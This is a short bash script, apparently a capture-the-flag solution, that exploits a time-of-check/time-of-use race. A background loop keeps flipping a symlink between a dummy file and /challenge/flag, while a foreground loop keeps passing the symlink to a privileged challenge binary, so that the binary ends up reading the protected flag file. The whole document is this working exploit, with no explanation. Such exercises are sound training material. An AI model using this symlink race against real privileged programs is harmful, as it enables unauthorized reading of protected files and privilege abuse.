#!/bin/bash
(
    while true; do
        ln -sf dummy pointer
        ln -sf /challenge/flag pointer
    done
) &

while true; do
    echo pointer | /challenge/challenge
done

